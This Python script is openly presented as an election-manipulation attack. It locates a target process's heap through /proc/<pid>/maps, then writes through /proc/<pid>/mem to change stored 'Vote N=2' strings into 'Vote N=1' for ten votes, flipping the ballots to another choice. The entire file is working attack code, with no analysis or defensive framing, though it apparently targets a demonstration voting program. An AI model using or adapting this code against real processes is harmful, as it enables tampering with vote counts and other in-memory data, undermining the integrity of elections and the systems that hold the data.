# -*- coding: utf-8 -*-
'''
Election manipulation.
Attack Non-Repudiation, Correct Execution and Ballot Privacy
'''
import sys
import time

def read_maps(pid):
	''' Read memory maps '''
	try:
		maps_file = open('/proc/{}/maps'.format(pid), 'r')
	except IOError as error:
		print('Cannot open file /proc/{}/maps: IOError: {}'.format(pid, error))
		sys.exit(1)
	heap_info = None
	for line in maps_file:
		if 'heap' in line:
			heap_info = line.split()
	maps_file.close()
	if not heap_info:
		print('No heap found!')
		sys.exit(1)
	addr = heap_info[0].split('-')
	perms = heap_info[1]
	return addr, perms

def rewrite_strings(addr, pid, read_str, write_str):
	''' Re-write program memory '''
	try:
		mem_file = open('/proc/{}/mem'.format(pid), 'rb+')
	except IOError as error:
		print('Cannot open file /proc/{}/mem: IOError: {}'.format(pid, error))
		sys.exit(1)
	heap_start = int(addr[0], 16)
	heap_end = int(addr[1], 16)
	mem_file.seek(heap_start)
	heap = mem_file.read(heap_end - heap_start)
	str_offset = heap.find(bytes(read_str, 'ASCII'))
	if str_offset > 0:
		mem_file.seek(heap_start + str_offset)
		mem_file.write(bytes(write_str, 'ASCII'))
		return True
	mem_file.close()
	return False

def steal_votes(addr, pid, vote_number):
	''' Check and re-write votes '''
	read_str = 'Vote %d=2' % vote_number
	write_str = 'Vote %d=1' % vote_number
	if rewrite_strings(addr, pid, read_str, write_str):
		print('Change the vote %d' % vote_number)
		print(read_str + ' --> ' + write_str)

def election_manipulation(pid):
	''' Attack Non-Repudiation, Correct Execution and Ballot Privacy '''
	addr, perms = read_maps(pid)
	if 'r' not in perms or 'w' not in perms:
		print('Heap does not have read and/or write permission')
		sys.exit(0)
	# Re-write votes
	for vote_number in range(1, 11):
		steal_votes(addr, pid, vote_number)

def main():
	''' Election manipulation '''
	pid = 0
	if len(sys.argv) == 2:
		try:
			pid = int(sys.argv[1])
		except ValueError:
			print('Please enter an integer argument!')
	if pid > 0:
		election_manipulation(pid)
	else:
		print('Usage: Give target process ID number as a parameter.')
		print('python3 %s <pid>' % str(sys.argv[0]))

if __name__ == '__main__':
    main()
